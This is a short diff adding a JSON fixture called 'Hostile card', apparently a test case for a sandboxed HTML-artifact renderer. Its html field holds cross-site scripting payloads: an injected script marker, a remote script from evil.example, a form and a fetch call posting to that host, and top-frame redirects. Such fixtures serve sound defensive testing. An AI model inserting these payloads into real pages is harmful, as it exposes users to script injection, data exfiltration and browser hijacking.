@@ -1,0 +1,6 @@
+{
+  "type": "html_artifact",
+  "title": "Hostile card",
+  "html": "<p>Visible</p><script>window.__pib_xss = 1</script><script src=\"https://evil.example/x.js\"></script><form method=\"post\" action=\"https://evil.example\"><button>x</button></form><a target=\"_top\" href=\"https://evil.example\">leave</a><script>fetch('https://evil.example'); window.top.location = 'https://evil.example'</script>",
+  "height": 240
+}
